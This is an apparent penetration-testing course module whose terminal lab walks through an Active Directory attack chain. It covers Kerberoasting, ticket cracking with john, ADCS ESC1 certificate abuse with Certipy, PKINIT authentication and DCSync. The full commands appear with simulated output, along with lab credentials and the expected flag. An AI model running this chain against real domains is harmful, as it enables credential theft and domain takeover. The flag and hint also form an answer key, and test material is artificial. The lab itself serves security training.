---
id: mod-pt-503
track_id: track-pentest
slug: ad-auth-abuse-kerberoasting-adcs-dcsync
title: '503: AD Authentication Attacks: Kerberoasting, ADCS (ESC1) & DCSync'
difficulty: Advanced
order_index: 19
estimated_minutes: 45
lab_type: terminal
lab_briefing: 'Execute the multi-stage Active Directory attack chain: (1) Request the Kerberos SPN ticket for mssql_svc and crack it offline, (2) query vulnerable ADCS templates using Certipy, (3) request an administrative certificate via ESC1, and (4) authenticate via PKINIT to retrieve the DCSync replication flag.'
expected_flag: FLAG{ADCS_ESC1_PKINIT_FOREST_DCSYNC}
hint: Complete the Certipy ESC1 request and PKINIT authentication step to capture FLAG{ADCS_ESC1_PKINIT_FOREST_DCSYNC}.
lab_config:
  target_ip: 172.16.50.20 (pki01) & 172.16.60.10 (dc01)
  quick_commands:
    - GetUserSPNs.py essos.local/samwell.tarly:CrowPass1! -dc-ip 172.16.50.12 -request
    - john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
    - certipy find -u 'mssql_svc@essos.local' -p 'Summer2026!' -dc-ip 172.16.60.10 -vulnerable
    - certipy req -u 'mssql_svc@essos.local' -p 'Summer2026!' -ca 'SEVENKINGDOMS-CA' -template 'ESC1-CorpClientAuth' -upn 'administrator@sevenkingdoms.local' -dc-ip 172.16.60.10
    - certipy auth -pfx administrator.pfx -dc-ip 172.16.60.10
  commands:
    GetUserSPNs.py essos.local/samwell.tarly:CrowPass1! -dc-ip 172.16.50.12 -request: |-
      ServicePrincipalName: MSSQLSvc/sql01.essos.local:1433
      Hash: $krb5tgs$23$*mssql_svc$ESSOS.LOCAL*$MSSQLSvc/sql01.essos.local:1433*$...[TICKET DUMPED]
      [+] Saved ticket to hashes.kerberoast
    john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast: |-
      Loaded 1 password hash (krb5tgs)
      Summer2026!      (mssql_svc)
      1 password hash cracked, 0 left
    certipy find -u 'mssql_svc@essos.local' -p 'Summer2026!' -dc-ip 172.16.60.10 -vulnerable: |-
      [*] Finding vulnerable certificate templates on 172.16.60.10...
      [*] Found 1 vulnerable template:
          Template: ESC1-CorpClientAuth
          Vulnerabilities: ESC1 (Enrollee Supplies Subject, Client Authentication enabled)
    certipy req -u 'mssql_svc@essos.local' -p 'Summer2026!' -ca 'SEVENKINGDOMS-CA' -template 'ESC1-CorpClientAuth' -upn 'administrator@sevenkingdoms.local' -dc-ip 172.16.60.10: |-
      [*] Requesting certificate for administrator@sevenkingdoms.local via ESC1-CorpClientAuth...
      [+] Certificate issued successfully! Saved to administrator.pfx
    certipy auth -pfx administrator.pfx -dc-ip 172.16.60.10: |-
      [*] Authenticating via PKINIT with certificate...
      [+] Got Kerberos TGT for administrator@sevenkingdoms.local
      [+] NT Hash: 7b841029e840a1b8... [DCSync Enabled]
      FLAG{ADCS_ESC1_PKINIT_FOREST_DCSYNC}
---

# 503: AD Authentication Attacks: Kerberoasting, ADCS (ESC1) & DCSync

## Sub-Unit 16.1 & 16.2: Kerberoasting and AS-REP Roasting Mechanics

Active Directory authentication attacks leverage legitimate Kerberos architecture:
- **AS-REP Roasting**: For accounts where pre-authentication is not required (`DONT_REQ_PREAUTH`), an attacker can request an AS-REP ticket without knowing the password and crack the ticket offline.
- **Kerberoasting**: Any domain user can request a Ticket Granting Service (TGS) ticket for any Service Principal Name (SPN). Because the ticket is encrypted using the target service account's secret key, it can be extracted and cracked offline with Hashcat or John the Ripper.

## Sub-Unit 16.3: Active Directory Certificate Services (ADCS ESC1) & DCSync

In modern enterprise networks, **Active Directory Certificate Services (ADCS)** is a primary privilege escalation vector:
- **ESC1 Template Misconfiguration**: A certificate template configured with `ENROLLEE_SUPPLIES_SUBJECT` and client authentication allows any low-privilege domain user to request a certificate as the Domain Administrator!
- Using **Certipy**:
```bash
certipy req -u 'user@domain.local' -p 'pass' -ca 'CORP-CA' -template 'ESC1-Template' -upn 'administrator@domain.local'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```
- **DCSync**: Once administrative credentials or replication privileges (`DS-Replication-Get-Changes-All`) are obtained, the `secretsdump.py` utility simulates a Domain Controller replication request to dump the forest root `krbtgt` hash.
